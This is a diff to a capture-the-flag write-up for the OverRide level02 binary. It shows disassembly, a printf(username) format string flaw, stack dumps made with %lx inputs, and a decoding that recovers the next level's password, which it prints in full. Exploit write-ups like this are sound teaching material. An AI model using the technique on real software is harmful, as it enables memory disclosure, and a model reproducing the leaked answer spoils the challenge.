@@ -40,7 +40,68 @@ ERROR: failed to open password file
 level02@OverRide:~$ file ./level02
 ./level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
 ```
-We can see the binary file is compiled in 64-bit,
+We can see the binary file is compiled in 64-bit. \
+After analyzing given executable we could find format string vulnerability at ```line+654```
+```sh
+   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax # var username
+   0x0000000000400a9a <+646>:   mov    %rax,%rdi
+   0x0000000000400a9d <+649>:   mov    $0x0,%eax # absence of formatter
+   0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt> # vuln printf(username)
+   0x0000000000400aa7 <+659>:   mov    $0x400d3a,%edi # " does not have access!"
+```
+But what can we do with this? How can we obtain the shell or access the flag using this vulnerability? \
+As we know there are 3 arrays in the main function, that stores: username, password, file_buffer. \
+Username and the password strings are where our input will be contained and file_buffer is where our ```flag``` will be stored after ```read``` function.
+```sh
+   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt> # fread(file_buffer, 41, 1, file stream)
+```
+So the flag is saved in local variable before it checks our password input, which means somehow it's possible to capture the flag without knowing the password! \
+Now back to our format string vulnerability, ```printf``` function is called after the flag is opened and saved in array ```file_buffer```. \
+Since local variables sequence is: username, file_buffer, password - we can try to look at the stack by corrupting username input. \
+For making this task easier we will create and use python script.
+```sh
+level02@OverRide:/tmp$ python /tmp/script.py 
+level02@OverRide:/tmp$ cat /tmp/dump.txt 
+0 | %0$lx does not have access!
+1 | 7fffffffe4d0 does not have access!
+2 | 0 does not have access!
+...
+21 | 0 does not have access!
+22 | 756e505234376848 does not have access!
+23 | 45414a3561733951 does not have access!
+24 | 377a7143574e6758 does not have access!
+25 | 354a35686e475873 does not have access!
+26 | 48336750664b394d does not have access!
+27 | feff00 does not have access!
+28 | 786c24383225 does not have access!
+...
+```
+Cool, we found some wierd stack datas from 22 to 26! \
+Let's try to see what these datas are by using our python decoder.
+```sh
+python3 hex_endian_converter.py
+From HEX to UTF-8
+Encoded (hex) string: 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
+756e505234376848  |  unPR47hH  |  Hh74RPnu
+45414a3561733951  |  EAJ5as9Q  |  Q9sa5JAE
+377a7143574e6758  |  7zqCWNgX  |  XgNWCqz7
+354a35686e475873  |  5J5hnGXs  |  sXGnh5J5
+48336750664b394d  |  H3gPfK9M  |  M9KfPg3H
+result:  Hh74RPnu Q9sa5JAE XgNWCqz7 sXGnh5J5 M9KfPg3H
+```
+We have to make sure that decoder did reversed bytes (little-endian byte order) and changed the format to utf-8. \
+Now it seems be like a password for the next level.
+
+```sh
+level02@OverRide:~$ su level03
+Password: (hidden)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
+```
+level02 passed !
+
+assmebly analayse
+---
 
 ```sh
 char str[96]
@@ -103,7 +164,7 @@ Dump of assembler code for function main:
    0x00000000004008f4 <+224>:   mov    $0x29,%edx # 41
    0x00000000004008f9 <+229>:   mov    $0x1,%esi
    0x00000000004008fe <+234>:   mov    %rax,%rdi #register convention  rdi rsi rdx rcx         r8 r9
-   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt> # fread(buffer, 41, 1, file stream)
+   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt> # fread(file_buffer, 41, 1, file stream)
    0x0000000000400906 <+242>:   mov    %eax,-0xc(%rbp)
    0x0000000000400909 <+245>:   lea    -0xa0(%rbp),%rax
    0x0000000000400910 <+252>:   mov    $0x400bf5,%esi
@@ -202,7 +263,3 @@ Dump of assembler code for function main:
    0x0000000000400ab6 <+674>:   callq  0x400710 <exit@plt> # exit(1)
 End of assembler dump.
 ```
-
-RPnuHh745JAEQ9saCqz7XgNWh5J5sXunPg3HM9Kf
-
-756e505234376848 45414a3561733951 377a7143574e6758 354a35686e755873 48336750664b394d
